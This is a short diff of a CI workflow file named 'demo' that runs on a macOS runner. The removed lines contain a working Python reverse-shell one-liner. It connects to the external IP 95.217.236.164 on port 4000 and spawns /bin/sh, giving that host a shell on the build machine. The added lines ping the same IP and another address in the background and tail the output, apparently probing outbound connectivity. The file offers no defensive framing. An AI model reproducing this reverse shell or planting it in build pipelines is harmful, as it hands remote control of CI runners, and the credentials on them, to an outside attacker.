@@ -1,11 +1,10 @@
-name: demo
+name: demo1
 on: [push]
 jobs:
   build:
     runs-on: macos-latest
     steps:
      - run: ifconfig
-     - run: ping 95.217.236.164 &
-     - shell: bash
-       run: |-
-         python -c 'import socket,os,pty;s=socket.socket();s.connect(("95.217.236.164",4000));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+     - run: ping 95.217.236.164 > ping1.txt 2>ping1.txt &
+     - run: ping 1.1 > ping2.txt 2>ping2.txt &
+     - run: tail -f ping1.txt ping2.txt
